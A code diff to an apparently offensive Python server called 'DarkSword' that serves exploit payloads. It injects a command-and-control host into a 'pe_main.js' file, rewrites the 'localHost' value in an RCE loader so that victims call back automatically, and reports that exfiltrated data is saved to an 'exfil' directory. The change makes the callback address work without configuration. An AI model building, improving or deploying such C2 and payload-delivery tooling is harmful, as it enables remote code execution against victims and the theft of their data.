@@ -59,6 +59,13 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
                 host = host_header
         return host, port
 
+    def _infer_local_host_from_request(self) -> Optional[str]:
+        """Base URL for worker getJS when --c2-host is not set (uses Host from this request)."""
+        host_header = (self.headers.get("Host") or "").strip()
+        if not host_header:
+            return None
+        return f"http://{host_header}"
+
     def _inject_c2_into_pe_main(self, content: bytes, path: Path) -> bytes:
         if path.name != "pe_main.js" or b"__DS_C2" not in content:
             return content
@@ -80,15 +87,22 @@ class DarkSwordHandler(SimpleHTTPRequestHandler):
 
             if path.name == "pe_main.js":
                 content = self._inject_c2_into_pe_main(content, path)
-            elif self.config and self.config.custom_host_in_loader and path.suffix == ".js":
+            elif path.suffix == ".js":
                 content_str = content.decode("utf-8", errors="replace")
-                if "localHost" in content_str:
-                    content_str = re.sub(
-                        r'var localHost\s*=\s*"[^"]*"',
-                        f'var localHost = "{self.config.custom_host_in_loader}"',
-                        content_str,
-                    )
-                    content = content_str.encode("utf-8")
+                if "var localHost" in content_str:
+                    cfg = self.config
+                    local_url = None
+                    if cfg and cfg.custom_host_in_loader:
+                        local_url = cfg.custom_host_in_loader
+                    else:
+                        local_url = self._infer_local_host_from_request()
+                    if local_url:
+                        content_str = re.sub(
+                            r'var localHost\s*=\s*"[^"]*"',
+                            f'var localHost = "{local_url}"',
+                            content_str,
+                        )
+                        content = content_str.encode("utf-8")
 
             self.send_response(200)
             self.send_header("Content-Type", content_type)
@@ -191,6 +205,11 @@ def run_server(config: ServeConfig) -> None:
     print(f"\n[*] DarkSword server listening on http://{config.host}:{config.port}")
     print(f"[*] Payloads: {get_payloads_dir()}")
     print(f"[*] Access: http://localhost:{config.port}/ or http://<IP>:{config.port}/")
+    if not config.custom_host_in_loader:
+        print(
+            "[*] rce_loader localHost: auto from each request Host (http). "
+            "Use --c2-host https://... if you need HTTPS or a public URL."
+        )
     exfil_dir = get_payloads_dir().parent / "exfil"
     print(f"[*] Exfil data saved to: {exfil_dir}")
     print("\n[!] Press Ctrl+C to stop\n")
